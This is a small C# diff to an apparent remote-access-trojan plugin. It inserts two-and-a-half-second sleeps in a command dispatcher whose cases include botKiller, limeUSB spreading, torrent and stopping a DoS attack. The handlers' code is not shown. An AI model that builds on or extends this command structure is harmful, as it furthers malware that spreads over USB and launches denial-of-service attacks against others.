@@ -27,6 +27,7 @@ namespace Plugin
                     case "botKiller":
                         {
                             new HandleBotKiller().RunBotKiller();
+                            Thread.Sleep(2500);
                             Connection.Disconnected();
                             break;
                         }
@@ -34,6 +35,7 @@ namespace Plugin
                     case "limeUSB":
                         {
                             new HandleLimeUSB().Initialize();
+                            Thread.Sleep(2500);
                             Connection.Disconnected();
                             break;
                         }
@@ -41,6 +43,7 @@ namespace Plugin
                     case "torrent":
                         {
                             new HandleTorrent(unpack_msgpack);
+                            Thread.Sleep(2500);
                             Connection.Disconnected();
                             break;
                         }
@@ -81,6 +84,7 @@ namespace Plugin
                                 case "postStop":
                                     {
                                         ctsDos.Cancel();
+                                        Thread.Sleep(2500);
                                         Connection.Disconnected();
                                         break;
                                     }
